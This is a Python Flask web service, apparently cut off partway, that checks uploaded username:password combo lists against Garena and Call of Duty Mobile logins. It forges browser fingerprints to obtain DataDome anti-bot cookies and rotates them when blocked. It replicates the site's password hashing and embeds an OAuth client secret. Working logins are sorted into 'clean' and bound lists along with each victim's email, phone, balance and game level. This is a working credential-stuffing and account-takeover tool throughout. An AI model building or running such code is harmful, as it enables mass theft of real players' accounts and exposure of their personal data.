import os
import sys
import time
import random
import hashlib
import json
import logging
import urllib.parse
import threading
import uuid
import base64
from datetime import datetime, timezone
from concurrent.futures import ThreadPoolExecutor
from threading import Lock
from functools import wraps
from Crypto.Cipher import AES
import requests
import cloudscraper
from flask import Flask, render_template, request, jsonify, session, send_file, url_for
from werkzeug.utils import secure_filename
from werkzeug.middleware.profiler import Profiler
import ipaddress

# Initialize Flask app
app = Flask(__name__)
app.config['SECRET_KEY'] = os.environ.get('SECRET_KEY', 'Antrax-codm-web-sek')
app.config['UPLOAD_FOLDER'] = 'uploads'
app.config['RESULTS_FOLDER'] = 'results'
app.config['MAX_CONTENT_LENGTH'] = 50 * 1024 * 1024  # 50MB max file size
app.config['MAX_ACCOUNTS_PER_CHECK'] = 10000  # Limit for PythonAnywhere

# Ensure directories exist
os.makedirs(app.config['UPLOAD_FOLDER'], exist_ok=True)
os.makedirs(app.config['RESULTS_FOLDER'], exist_ok=True)
os.makedirs('config', exist_ok=True)

# Configure logging
logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

# Global variables for active checks
active_checks = {}
check_lock = Lock()
stats_lock = Lock()

# Helper function to get client IP
def get_client_ip():
    """Get the real client IP address considering proxies"""
    if request.headers.get('X-Forwarded-For'):
        # Client IP is the first in the list
        ip = request.headers.get('X-Forwarded-For').split(',')[0].strip()
    elif request.headers.get('X-Real-IP'):
        ip = request.headers.get('X-Real-IP')
    else:
        ip = request.remote_addr
    
    # Handle localhost
    if ip == '127.0.0.1' or ip.startswith('192.168.'):
        # Try to get public IP for local development
        try:
            response = requests.get('https://api.ipify.org', timeout=5)
            if response.status_code == 200:
                return response.text.strip()
        except:
            pass
    
    return ip

# Decorator to track IP for each request
def track_ip(f):
    @wraps(f)
    def decorated_function(*args, **kwargs):
        client_ip = get_client_ip()
        # Add IP to request context
        request.client_ip = client_ip
        logger.info(f"Request from IP: {client_ip} - {request.path}")
        return f(*args, **kwargs)
    return decorated_function

# Original Classes (adapted from your code)
class Colors:
    LIGHTGREEN_EX = '\033[92m'
    LIGHTCYAN_EX = '\033[96m'
    LIGHTYELLOW_EX = '\033[93m'
    LIGHTRED_EX = '\033[91m'
    LIGHTBLUE_EX = '\033[94m'
    LIGHTWHITE_EX = '\033[97m'
    LIGHTBLACK_EX = '\033[90m'
    WHITE = '\033[97m'
    BLUE = '\033[94m'
    GREEN = '\033[92m'
    RED = '\033[91m'
    CYAN = '\033[96m'
    YELLOW = '\033[93m'
    MAGENTA = '\033[95m'
    RESET = '\033[0m'

class CookieManager:
    def __init__(self):
        self.banned_cookies = set()
        self.load_banned_cookies()
    
    def load_banned_cookies(self):
        if os.path.exists('config/banned_cookies.txt'):
            with open('config/banned_cookies.txt', 'r') as f:
                self.banned_cookies = set(line.strip() for line in f if line.strip())
    
    def is_banned(self, cookie):
        return cookie in self.banned_cookies
    
    def mark_banned(self, cookie):
        self.banned_cookies.add(cookie)
        with open('config/banned_cookies.txt', 'a') as f:
            f.write(cookie + '\n')
    
    def get_valid_cookies(self):
        valid_cookies = []
        if os.path.exists('config/fresh_cookie.txt'):
            with open('config/fresh_cookie.txt', 'r') as f:
                valid_cookies = [c.strip() for c in f.read().splitlines()
                               if c.strip() and not self.is_banned(c.strip())]
        random.shuffle(valid_cookies)
        return valid_cookies
    
    def save_cookie(self, datadome_value):
        formatted_cookie = f"datadome={datadome_value.strip()}"
        if not self.is_banned(formatted_cookie):
            existing_cookies = set()
            if os.path.exists('config/fresh_cookie.txt'):
                with open('config/fresh_cookie.txt', 'r') as f:
                    existing_cookies = set(line.strip() for line in f if line.strip())
            
            if formatted_cookie not in existing_cookies:
                with open('config/fresh_cookie.txt', 'a') as f:
                    f.write(formatted_cookie + '\n')
                return True
            return False
        return False

class DataDomeManager:
    def __init__(self):
        self.current_datadome = None
        self.datadome_history = []
        self._403_attempts = 0
        self._blocked = False
    
    def set_datadome(self, datadome_cookie):
        if datadome_cookie and datadome_cookie != self.current_datadome:
            self.current_datadome = datadome_cookie
            self.datadome_history.append(datadome_cookie)
            if len(self.datadome_history) > 10:
                self.datadome_history.pop(0)
    
    def get_datadome(self):
        return self.current_datadome
    
    def extract_datadome_from_session(self, session):
        try:
            cookies_dict = session.cookies.get_dict()
            datadome_cookie = cookies_dict.get('datadome')
            if datadome_cookie:
                self.set_datadome(datadome_cookie)
                return datadome_cookie
            return None
        except Exception as e:
            logger.warning(f"Error extracting datadome: {e}")
            return None
    
    def clear_session_datadome(self, session):
        try:
            if 'datadome' in session.cookies:
                del session.cookies['datadome']
        except Exception as e:
            logger.warning(f"Error clearing datadome: {e}")
    
    def set_session_datadome(self, session, datadome_cookie=None):
        try:
            self.clear_session_datadome(session)
            cookie_to_use = datadome_cookie or self.current_datadome
            if cookie_to_use:
                session.cookies.set('datadome', cookie_to_use, domain='.garena.com')
                return True
            return False
        except Exception as e:
            logger.warning(f"Error setting datadome: {e}")
            return False
    
    def get_current_ip(self):
        ip_services = [
            'https://api.ipify.org',
            'https://icanhazip.com',
            'https://ident.me',
            'https://checkip.amazonaws.com'
        ]
        
        for service in ip_services:
            try:
                response = requests.get(service, timeout=10)
                if response.status_code == 200:
                    ip = response.text.strip()
                    if ip and '.' in ip:
                        return ip
            except Exception:
                continue
        
        return None
    
    def fetch_fresh_datadome_with_retry(self, session, max_retries=3):
        for attempt in range(1, max_retries + 1):
            try:
                logger.info(f"Fetching fresh DataDome (attempt {attempt}/{max_retries})")
                fresh_session = cloudscraper.create_scraper()
                new_datadome = get_datadome_cookie(fresh_session)
                
                if new_datadome:
                    logger.info(f"Fresh DataDome cookie obtained")
                    self.set_datadome(new_datadome)
                    self.set_session_datadome(session, new_datadome)
                    return True
                else:
                    logger.warning(f"Attempt {attempt}: Failed to get DataDome")
            
            except Exception as e:
                logger.error(f"Attempt {attempt}: Error - {str(e)[:50]}")
            
            if attempt < max_retries:
                time.sleep(2 ** attempt)
        
        return False
    
    def handle_403(self, session):
        self._403_attempts += 1
        logger.error(f"403 Blocked - Attempt {self._403_attempts}/3")
        
        if self._403_attempts >= 3:
            self._blocked = True
            logger.error(f"IP blocked after 3 attempts")
            return False
        else:
            logger.info(f"Attempting fresh DataDome...")
            if self.fetch_fresh_datadome_with_retry(session, max_retries=2):
                logger.info(f"Fresh cookie obtained")
                return False
        
        return False
    
    def is_blocked(self):
        return self._blocked
    
    def reset_attempts(self):
        self._403_attempts = 0
        self._blocked = False

class LiveStats:
    def __init__(self):
        self.valid_count = 0
        self.invalid_count = 0
        self.clean_count = 0
        self.not_clean_count = 0
        self.has_codm_count = 0
        self.no_codm_count = 0
        self.total_processed = 0
        self.lock = Lock()
    
    def update_stats(self, valid=False, clean=False, has_codm=False):
        with self.lock:
            self.total_processed += 1
            if valid:
                self.valid_count += 1
                if clean:
                    self.clean_count += 1
                else:
                    self.not_clean_count += 1
                if has_codm:
                    self.has_codm_count += 1
                else:
                    self.no_codm_count += 1
            else:
                self.invalid_count += 1
    
    def get_stats(self):
        with self.lock:
            return {
                'valid': self.valid_count,
                'invalid': self.invalid_count,
                'clean': self.clean_count,
                'not_clean': self.not_clean_count,
                'has_codm': self.has_codm_count,
                'no_codm': self.no_codm_count,
                'total': self.total_processed
            }

# Crypto Functions
def encode(plaintext, key):
    key = bytes.fromhex(key)
    plaintext = bytes.fromhex(plaintext)
    cipher = AES.new(key, AES.MODE_ECB)
    ciphertext = cipher.encrypt(plaintext)
    return ciphertext.hex()[:32]

def get_passmd5(password):
    decoded_password = urllib.parse.unquote(password)
    return hashlib.md5(decoded_password.encode('utf-8')).hexdigest()

def hash_password(password, v1, v2):
    passmd5 = get_passmd5(password)
    inner_hash = hashlib.sha256((passmd5 + v1).encode()).hexdigest()
    outer_hash = hashlib.sha256((inner_hash + v2).encode()).hexdigest()
    return encode(passmd5, outer_hash)

def applyck(session, cookie_str):
    session.cookies.clear()
    cookie_dict = {}
    for item in cookie_str.split(";"):
        item = item.strip()
        if '=' in item:
            try:
                key, value = item.split("=", 1)
                key = key.strip()
                value = value.strip()
                if key and value:
                    cookie_dict[key] = value
            except:
                pass
    
    if cookie_dict:
        session.cookies.update(cookie_dict)

def get_datadome_cookie(session):
    url = 'https://dd.garena.com/js/'
    headers = {
        'accept': '*/*',
        'content-type': 'application/x-www-form-urlencoded',
        'origin': 'https://account.garena.com',
        'referer': 'https://account.garena.com/',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/129.0.0.0 Safari/537.36'
    }
    
    payload = {
        "jsData": json.dumps({"ttst": 76.7, "ifov": False, "hc": 4, "br_oh": 824, "br_ow": 1536, "ua": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/129.0.0.0 Safari/537.36", "wbd": False, "dp0": True, "tagpu": 5.73, "wdifrm": False, "npmtm": False, "br_h": 738, "br_w": 260, "isf": False, "nddc": 1, "rs_h": 864, "rs_w": 1536, "rs_cd": 24, "phe": False, "nm": False, "jsf": False, "lg": "en-US", "pr": 1.25, "ars_h": 824, "ars_w": 1536, "tz": -480, "str_ss": True, "str_ls": True, "str_idb": True, "str_odb": False, "plgod": False, "plg": 5, "plgne": True, "plgre": True, "plgof": False, "plggt": False, "pltod": False, "hcovdr": False, "hcovdr2": False, "plovdr": False, "plovdr2": False, "ftsovdr": False, "ftsovdr2": False, "lb": False, "eva": 33, "lo": False, "ts_mtp": 0, "ts_tec": False, "ts_tsa": False, "vnd": "Google Inc.", "bid": "NA", "mmt": "application/pdf,text/pdf", "plu": "PDF Viewer,Chrome PDF Viewer,Chromium PDF Viewer,Microsoft Edge PDF Viewer,WebKit built-in PDF", "hdn": False, "awe": False, "geb": False, "dat": False, "med": "defined", "aco": "probably", "acots": False, "acmp": "probably", "acmpts": True, "acw": "probably", "acwts": False, "acma": "maybe", "acmats": False, "acaa": "probably", "acaats": True, "ac3": "", "ac3ts": False, "acf": "probably", "acfts": False, "acmp4": "maybe", "acmp4ts": False, "acmp3": "probably", "acmp3ts": False, "acwm": "maybe", "acwmts": False, "ocpt": False, "vco": "", "vcots": False, "vch": "probably", "vchts": True, "vcw": "probably", "vcwts": True, "vc3": "maybe", "vc3ts": False, "vcmp": "", "vcmpts": False, "vcq": "maybe", "vcqts": False, "vc1": "probably", "vc1ts": True, "dvm": 8, "sqt": False, "so": "landscape-primary", "bda": False, "wdw": True, "prm": True, "tzp": True, "cvs": True, "usb": True, "cap": True, "tbf": False, "lgs": True, "tpd": True}),
        'eventCounters': '[]',
        'jsType': 'ch',
        'cid': 'KOWn3t9QNk3dJJJEkpZJpspfb2HPZIVs0KSR7RYTscx5iO7o84cw95j40zFFG7mpfbKxmfhAOs~bM8Lr8cHia2JZ3Cq2LAn5k6XAKkONfSSad99Wu36EhKYyODGCZwae',
        'ddk': 'AE3F04AD3F0D3A462481A337485081',
        'Referer': 'https://account.garena.com/',
        'request': '/',
        'responsePage': 'origin',
        'ddv': '4.35.4'
    }
    
    data = '&'.join(f'{k}={urllib.parse.quote(str(v))}' for k, v in payload.items())
    
    try:
        response = requests.post(url, headers=headers, data=data, timeout=15)
        response_json = response.json()
        if response_json.get('status') == 200 and 'cookie' in response_json:
            cookie_string = response_json['cookie']
            datadome = cookie_string.split(';')[0].split('=')[1]
            return datadome
    except Exception as e:
        logger.error(f"Error getting DataDome: {e}")
    return None

def prelogin(session, account, datadome_manager):
    url = 'https://sso.garena.com/api/prelogin'
    
    try:
        account.encode('latin-1')
    except UnicodeEncodeError:
        return None, None, None
    
    params = {
        'app_id': '10100',
        'account': account,
        'format': 'json',
        'id': str(int(time.time() * 1000))
    }
    
    retries = 2
    for attempt in range(retries):
        try:
            current_cookies = session.cookies.get_dict()
            cookie_parts = []
            
            for cookie_name in ['apple_state_key', 'datadome', 'sso_key']:
                if cookie_name in current_cookies:
                    cookie_parts.append(f"{cookie_name}={current_cookies[cookie_name]}")
            
            cookie_header = '; '.join(cookie_parts) if cookie_parts else ''
            
            headers = {
                'accept': 'application/json, text/plain, */*',
                'accept-encoding': 'gzip, deflate, br, zstd',
                'accept-language': 'en-US,en;q=0.9',
                'connection': 'keep-alive',
                'host': 'sso.garena.com',
                'referer': f'https://sso.garena.com/universal/login?app_id=10100&redirect_uri=https%3A%2F%2Faccount.garena.com%2F&locale=en-SG&account={account}',
                'sec-ch-ua': '"Google Chrome";v="133", "Chromium";v="133", "Not=A?Brand";v="99"',
                'sec-ch-ua-mobile': '?0',
                'sec-ch-ua-platform': '"Windows"',
                'sec-fetch-dest': 'empty',
                'sec-fetch-mode': 'cors',
                'sec-fetch-site': 'same-origin',
                'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36'
            }
            
            if cookie_header:
                headers['cookie'] = cookie_header
            
            response = session.get(url, headers=headers, params=params, timeout=30)
            
            new_cookies = {}
            
            if 'set-cookie' in response.headers:
                set_cookie_header = response.headers['set-cookie']
                for cookie_str in set_cookie_header.split(','):
                    if '=' in cookie_str:
                        try:
                            cookie_name = cookie_str.split('=')[0].strip()
                            cookie_value = cookie_str.split('=')[1].split(';')[0].strip()
                            if cookie_name and cookie_value:
                                new_cookies[cookie_name] = cookie_value
                        except:
                            pass
            
            try:
                response_cookies = response.cookies.get_dict()
                for cookie_name, cookie_value in response_cookies.items():
                    if cookie_name not in new_cookies:
                        new_cookies[cookie_name] = cookie_value
            except:
                pass
            
            for cookie_name, cookie_value in new_cookies.items():
                if cookie_name in ['datadome', 'apple_state_key', 'sso_key']:
                    session.cookies.set(cookie_name, cookie_value, domain='.garena.com')
                    if cookie_name == 'datadome':
                        datadome_manager.set_datadome(cookie_value)
            
            new_datadome = new_cookies.get('datadome')
            
            if response.status_code == 403:
                if new_cookies and attempt < retries - 1:
                    time.sleep(2)
                    continue
                
                if datadome_manager.handle_403(session):
                    return "IP_BLOCKED", None, None
                return None, None, new_datadome
            
            response.raise_for_status()
            
            try:
                data = response.json()
            except:
                if attempt < retries - 1:
                    time.sleep(2)
                    continue
                return None, None, new_datadome
            
            if 'error' in data:
                return None, None, new_datadome
            
            v1 = data.get('v1')
            v2 = data.get('v2')
            
            if not v1 or not v2:
                return None, None, new_datadome
            
            return v1, v2, new_datadome
        
        except Exception:
            if attempt < retries - 1:
                time.sleep(2)
                continue
    
    return None, None, None

def login(session, account, password, v1, v2):
    hashed_password = hash_password(password, v1, v2)
    url = 'https://sso.garena.com/api/login'
    params = {
        'app_id': '10100',
        'account': account,
        'password': hashed_password,
        'redirect_uri': 'https://account.garena.com/',
        'format': 'json',
        'id': str(int(time.time() * 1000))
    }
    
    current_cookies = session.cookies.get_dict()
    cookie_parts = []
    for cookie_name in ['apple_state_key', 'datadome', 'sso_key']:
        if cookie_name in current_cookies:
            cookie_parts.append(f"{cookie_name}={current_cookies[cookie_name]}")
    cookie_header = '; '.join(cookie_parts) if cookie_parts else ''
    
    headers = {
        'accept': 'application/json, text/plain, */*',
        'referer': 'https://account.garena.com/',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/129.0.0.0 Safari/537.36'
    }
    
    if cookie_header:
        headers['cookie'] = cookie_header
    
    retries = 2
    for attempt in range(retries):
        try:
            response = session.get(url, headers=headers, params=params, timeout=30)
            response.raise_for_status()
            
            login_cookies = {}
            
            if 'set-cookie' in response.headers:
                set_cookie_header = response.headers['set-cookie']
                for cookie_str in set_cookie_header.split(','):
                    if '=' in cookie_str:
                        try:
                            cookie_name = cookie_str.split('=')[0].strip()
                            cookie_value = cookie_str.split('=')[1].split(';')[0].strip()
                            if cookie_name and cookie_value:
                                login_cookies[cookie_name] = cookie_value
                        except:
                            pass
            
            try:
                response_cookies = response.cookies.get_dict()
                for cookie_name, cookie_value in response_cookies.items():
                    if cookie_name not in login_cookies:
                        login_cookies[cookie_name] = cookie_value
            except:
                pass
            
            for cookie_name, cookie_value in login_cookies.items():
                if cookie_name in ['sso_key', 'apple_state_key', 'datadome']:
                    session.cookies.set(cookie_name, cookie_value, domain='.garena.com')
            
            try:
                data = response.json()
            except:
                if attempt < retries - 1:
                    time.sleep(2)
                    continue
                return None
            
            sso_key = login_cookies.get('sso_key') or response.cookies.get('sso_key')
            
            if 'error' in data:
                error_msg = data['error']
                if error_msg == 'ACCOUNT DOESNT EXIST':
                    return None
                elif 'captcha' in error_msg.lower():
                    time.sleep(3)
                    continue
                else:
                    return None
            
            return sso_key
        
        except Exception:
            if attempt < retries - 1:
                time.sleep(2)
    
    return None

def get_codm_access_token(session):
    try:
        random_id = str(int(time.time() * 1000))
        grant_url = "https://100082.connect.garena.com/oauth/token/grant"
        
        grant_headers = {
            "Host": "100082.connect.garena.com",
            "Connection": "keep-alive",
            "sec-ch-ua-platform": "\"Android\"",
            "User-Agent": "Mozilla/5.0 (Linux; Android 15; Lenovo TB-9707F Build/AP3A.240905.015.A2; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/144.0.7559.59 Mobile Safari/537.36; GarenaMSDK/5.12.1(Lenovo TB-9707F ;Android 15;en;us;)",
            "Accept": "application/json, text/plain, */*",
            "sec-ch-ua": "\"Not(A:Brand\";v=\"8\", \"Chromium\";v=\"144\", \"Android WebView\";v=\"144\"",
            "Content-Type": "application/x-www-form-urlencoded;charset=UTF-8",
            "sec-ch-ua-mobile": "?1",
            "Origin": "https://100082.connect.garena.com",
            "X-Requested-With": "com.garena.game.codm",
            "Sec-Fetch-Site": "same-origin",
            "Sec-Fetch-Mode": "cors",
            "Sec-Fetch-Dest": "empty",
            "Referer": "https://100082.connect.garena.com/universal/oauth?client_id=100082&locale=en-US&create_grant=true&login_scenario=normal&redirect_uri=gop100082://auth/&response_type=code",
            "Accept-Encoding": "gzip, deflate, br, zstd",
            "Accept-Language": "en-US,en;q=0.9"
        }
        
        device_id = f"02-{str(uuid.uuid4())}"
        grant_data = f"client_id=100082&redirect_uri=gop100082%3A%2F%2Fauth%2F&response_type=code&id={random_id}"
        
        grant_response = session.post(grant_url, headers=grant_headers, data=grant_data, timeout=15)
        grant_json = grant_response.json()
        auth_code = grant_json.get("code", "")
        
        if not auth_code:
            return "", "", ""
        
        token_url = "https://100082.connect.garena.com/oauth/token/exchange"
        
        token_headers = {
            "User-Agent": "GarenaMSDK/5.12.1(Lenovo TB-9707F ;Android 15;en;us;)",
            "Content-Type": "application/x-www-form-urlencoded",
            "Host": "100082.connect.garena.com",
            "Connection": "Keep-Alive",
            "Accept-Encoding": "gzip"
        }
        
        token_data = f"grant_type=authorization_code&code={auth_code}&device_id={device_id}&redirect_uri=gop100082%3A%2F%2Fauth%2F&source=2&client_id=100082&client_secret=388066813c7cda8d51c1a70b0f6050b991986326fcfb0cb3bf2287e861cfa415"
        
        token_response = session.post(token_url, headers=token_headers, data=token_data, timeout=15)
        token_json = token_response.json()
        
        access_token = token_json.get("access_token", "")
        open_id = token_json.get("open_id", "")
        uid = token_json.get("uid", "")
        
        return access_token, open_id, uid
    except Exception as e:
        logger.error(f"Error getting CODM token: {e}")
        return "", "", ""

def process_codm_callback(session, access_token, open_id=None, uid=None):
    try:
        aos_callback_url = f"https://api-delete-request-aos.codm.garena.co.id/oauth/callback/?access_token={access_token}"
        
        aos_headers = {
            "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
            "user-agent": "Mozilla/5.0 (Linux; Android 15; Lenovo TB-9707F Build/AP3A.240905.015.A2; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/144.0.7559.59 Mobile Safari/537.36",
            "referer": "https://100082.connect.garena.com/",
            "x-requested-with": "com.garena.game.codm"
        }
        
        aos_response = session.get(aos_callback_url, headers=aos_headers, allow_redirects=False, timeout=15)
        aos_location = aos_response.headers.get("Location", "")
        
        if "err=3" in aos_location:
            return None, "no_codm"
        elif "token=" in aos_location:
            token = aos_location.split("token=")[-1].split('&')[0]
            return token, "success"
        
        return None, "unknown_error"
    
    except Exception as e:
        logger.error(f"Error processing CODM callback: {e}")
        return None, "error"

def get_codm_user_info(session, token):
    try:
        try:
            parts = token.split('.')
            if len(parts) == 3:
                payload = parts[1]
                padding = 4 - len(payload) % 4
                if padding != 4:
                    payload += '=' * padding
                
                decoded = base64.urlsafe_b64decode(payload)
                jwt_data = json.loads(decoded)
                
                user_data = jwt_data.get("user", {})
                if user_data:
                    return {
                        "codm_nickname": user_data.get("codm_nickname", user_data.get("nickname", "N/A")),
                        "codm_level": user_data.get("codm_level", "N/A"),
                        "region": user_data.get("region", "N/A"),
                        "uid": user_data.get("uid", "N/A"),
                    }
        except:
            pass
        
        url = "https://api-delete-request-aos.codm.garena.co.id/oauth/check_login/"
        
        headers = {
            "accept": "application/json, text/plain, */*",
            "codm-delete-token": token,
            "origin": "https://delete-request-aos.codm.garena.co.id",
            "referer": "https://delete-request-aos.codm.garena.co.id/",
            "user-agent": "Mozilla/5.0 (Linux; Android 15; Lenovo TB-9707F Build/AP3A.240905.015.A2; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/144.0.7559.59 Mobile Safari/537.36",
            "x-requested-with": "com.garena.game.codm"
        }
        
        response = session.get(url, headers=headers, timeout=15)
        data = response.json()
        user_data = data.get("user", {})
        
        if user_data:
            return {
                "codm_nickname": user_data.get("codm_nickname", "N/A"),
                "codm_level": user_data.get("codm_level", "N/A"),
                "region": user_data.get("region", "N/A"),
                "uid": user_data.get("uid", "N/A"),
            }
        return {}
    
    except Exception as e:
        logger.error(f"Error getting CODM user info: {e}")
        return {}

def parse_account_details(data):
    user_info = data.get('user_info', {})
    
    account_info = {
        'uid': user_info.get('uid', 'N/A'),
        'username': user_info.get('username', 'N/A'),
        'nickname': user_info.get('nickname', 'N/A'),
        'email': user_info.get('email', 'N/A'),
        'email_verified': bool(user_info.get('email_v', 0)),
        'security': {
            'two_step_verify': bool(user_info.get('two_step_verify_enable', 0)),
            'authenticator_app': bool(user_info.get('authenticator_enable', 0)),
            'facebook_connected': bool(user_info.get('is_fbconnect_enabled', False)),
            'suspicious': bool(user_info.get('suspicious', False))
        },
        'personal': {
            'country': user_info.get('acc_country', 'N/A'),
            'mobile_no': user_info.get('mobile_no', 'N/A'),
        },
        'profile': {
            'shell_balance': user_info.get('shell', 0)
        },
        'status': {
            'account_status': "Active" if user_info.get('status', 0) == 1 else "Inactive"
        },
        'binds': [],
        'game_info': []
    }
    
    email = account_info['email']
    if email != 'N/A' and email and '@' in email:
        account_info['binds'].append('Email')
    
    mobile_no = account_info['personal']['mobile_no']
    if mobile_no != 'N/A' and mobile_no and mobile_no.strip():
        account_info['binds'].append('Phone')
    
    if account_info['security']['facebook_connected']:
        account_info['binds'].append('Facebook')
    
    if user_info.get('email_v', 0) == 1 or len(account_info['binds']) > 0:
        account_info['is_clean'] = False
        account_info['bind_status'] = f"Bound ({', '.join(account_info['binds']) or 'Email Verified'})"
    else:
        account_info['is_clean'] = True
        account_info['bind_status'] = "Clean"
    
    return account_info

def process_account(session, account, password, cookie_manager, datadome_manager, live_stats, result_folder, check_id):
    try:
        if datadome_manager.is_blocked():
            return "RATE_LIMITED"
        
        datadome_manager.clear_session_datadome(session)
        current_datadome = datadome_manager.get_datadome()
        if current_datadome:
            datadome_manager.set_session_datadome(session, current_datadome)
        
        v1, v2, new_datadome = prelogin(session, account, datadome_manager)
        
        if v1 == "IP_BLOCKED":
            return "RATE_LIMITED"
        
        if not v1 or not v2:
            live_stats.update_stats(valid=False)
            return "Prelogin Failed"
        
        if new_datadome:
            datadome_manager.set_datadome(new_datadome)
            datadome_manager.set_session_datadome(session, new_datadome)
        
        sso_key = login(session, account, password, v1, v2)
        
        if not sso_key:
            live_stats.update_stats(valid=False)
            return "Login Failed"
        
        # Get account info
        current_cookies = session.cookies.get_dict()
        cookie_parts = []
        for cookie_name in ['apple_state_key', 'datadome', 'sso_key']:
            if cookie_name in current_cookies:
                cookie_parts.append(f"{cookie_name}={current_cookies[cookie_name]}")
        cookie_header = '; '.join(cookie_parts) if cookie_parts else ''
        
        headers = {
            'accept': '*/*',
            'referer': 'https://account.garena.com/',
            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/129.0.0.0 Safari/537.36'
        }
        if cookie_header:
            headers['cookie'] = cookie_header
        
        response = session.get('https://account.garena.com/api/account/init', headers=headers, timeout=30)
        
        if response.status_code == 403:
            if datadome_manager.handle_403(session):
                return process_account(session, account, password, cookie_manager, datadome_manager, live_stats, result_folder, check_id)
            live_stats.update_stats(valid=False)
            return "Security Ban"
        
        try:
            account_data = response.json()
        except:
            live_stats.update_stats(valid=False)
            return "Invalid Response"
        
        if 'error' in account_data:
            live_stats.update_stats(valid=False)
            return "Account Error"
        
        if 'user_info' in account_data:
            details = parse_account_details(account_data)
        else:
            details = parse_account_details({'user_info': account_data})
        
        # Check CODM
        access_token, open_id, uid = get_codm_access_token(session)
        has_codm = False
        codm_info = None
        
        if access_token:
            codm_token, status = process_codm_callback(session, access_token, open_id, uid)
            if status == "success" and codm_token:
                codm_info = get_codm_user_info(session, codm_token)
                if codm_info:
                    has_codm = True
        
        # Save account details
        save_account_details(account, password, details, codm_info, result_folder, check_id)
        
        # Update stats
        live_stats.update_stats(valid=True, clean=details.get('is_clean', False), has_codm=has_codm)
        
        # Save fresh cookie if available
        fresh_datadome = datadome_manager.extract_datadome_from_session(session)
        if fresh_datadome:
            cookie_manager.save_cookie(fresh_datadome)
        
        return "SUCCESS"
        
    except Exception as e:
        logger.error(f"Error processing {account}: {e}")
        live_stats.update_stats(valid=False)
        return f"Error"

def save_account_details(account, password, details, codm_info, result_folder, check_id):
    try:
        os.makedirs(os.path.join(result_folder, check_id), exist_ok=True)
        
        is_clean = details.get('is_clean', False)
        
        # Save to clean/notclean files
        if is_clean:
            file_path = os.path.join(result_folder, check_id, 'clean_accounts.txt')
        else:
            file_path = os.path.join(result_folder, check_id, 'notclean_accounts.txt')
        
        with open(file_path, 'a', encoding='utf-8') as f:
            f.write(f"{account}:{password}\n")
        
        # Save detailed info
        details_file = os.path.join(result_folder, check_id, 'detailed_results.txt')
        with open(details_file, 'a', encoding='utf-8') as f:
            f.write("=" * 60 + "\n")
            f.write(f"Account: {account}:{password}\n")
            f.write(f"Username: {details.get('username', 'N/A')}\n")
            f.write(f"Nickname: {details.get('nickname', 'N/A')}\n")
            f.write(f"Email: {details.get('email', 'N/A')}\n")
            f.write(f"Email Verified: {details.get('email_verified', False)}\n")
            f.write(f"Phone: {details.get('personal', {}).get('mobile_no', 'N/A')}\n")
            f.write(f"Country: {details.get('personal', {}).get('country', 'N/A')}\n")
            f.write(f"Shell Balance: {details.get('profile', {}).get('shell_balance', 0)}\n")
            f.write(f"Bind Status: {details.get('bind_status', 'N/A')}\n")
            
            if codm_info:
                f.write(f"CODM Nickname: {codm_info.get('codm_nickname', 'N/A')}\n")
                f.write(f"CODM Level: {codm_info.get('codm_level', 'N/A')}\n")
                f.write(f"CODM Region: {codm_info.get('region', 'N/A')}\n")
                f.write(f"CODM UID: {codm_info.get('uid', 'N/A')}\n")
            
            f.write("=" * 60 + "\n\n")
        
        # Save CODM accounts separately
        if codm_info and codm_info.get('codm_nickname') != 'N/A':
            codm_file = os.path.join(result_folder, check_id, 'codm_accounts.txt')
            with open(codm_file, 'a', encoding='utf-8') as f:
                f.write(f"{account}:{password} | Level: {codm_info.get('codm_level', 'N/A')} | Nickname: {codm_info.get('codm_nickname', 'N/A')} | Region: {codm_info.get('region', 'N/A')} | UID: {codm_info.get('uid', 'N/A')}\n")
        
        return True
    except Exception as e:
        logger.error(f"Error saving account: {e}")
        return False

# Flask Routes
@app.route('/')
@track_ip
def index():
    client_ip = request.client_ip
    return render_template('index.html', client_ip=client_ip)

@app.route('/api/upload', methods=['POST'])
@track_ip
def upload_file():
    if 'file' not in request.files:
        return jsonify({'error': 'No file uploaded'}), 400
    
    file = request.files['file']
    if file.filename == '':
        return jsonify({'error': 'No file selected'}), 400
    
    if not file.filename.endswith('.txt'):
        return jsonify({'error': 'Only .txt files are allowed'}), 400
    
    filename = secure_filename(file.filename)
    # Add timestamp to filename to avoid conflicts
    name, ext = os.path.splitext(filename)
    timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
    filename = f"{name}_{timestamp}{ext}"
    
    filepath = os.path.join(app.config['UPLOAD_FOLDER'], filename)
    file.save(filepath)
    
    # Count lines and validate format
    valid_lines = 0
    invalid_lines = 0
    with open(filepath, 'r', encoding='utf-8', errors='ignore') as f:
        for line in f:
            line = line.strip()
            if line and ':' in line:
                valid_lines += 1
            elif line:
                invalid_lines += 1
    
    # Check limit
    if valid_lines > app.config['MAX_ACCOUNTS_PER_CHECK']:
        os.remove(filepath)
        return jsonify({
            'error': f'Too many accounts. Maximum is {app.config["MAX_ACCOUNTS_PER_CHECK"]}'
        }), 400
    
    return jsonify({
        'success': True,
        'filename': filename,
        'path': filepath,
        'valid_lines': valid_lines,
        'invalid_lines': invalid_lines,
        'total_lines': valid_lines + invalid_lines
    })

@app.route('/api/start', methods=['POST'])
@track_ip
def start_check():
    data = request.json
    filename = data.get('filename')
    threads = int(data.get('threads', 3))  # Limit threads for PythonAnywhere
    auto_remove = data.get('auto_remove', False)
    
    # Enforce limits
    threads = min(threads, 5)  # Max 5 threads on PythonAnywhere
    
    if not filename:
        return jsonify({'error': 'No filename provided'}), 400
    
    filepath = os.path.join(app.config['UPLOAD_FOLDER'], filename)
    if not os.path.exists(filepath):
        return jsonify({'error': 'File not found'}), 404
    
    # Generate unique check ID
    check_id = str(uuid.uuid4())
    client_ip = request.client_ip
    
    # Initialize check info
    with check_lock:
        active_checks[check_id] = {
            'id': check_id,
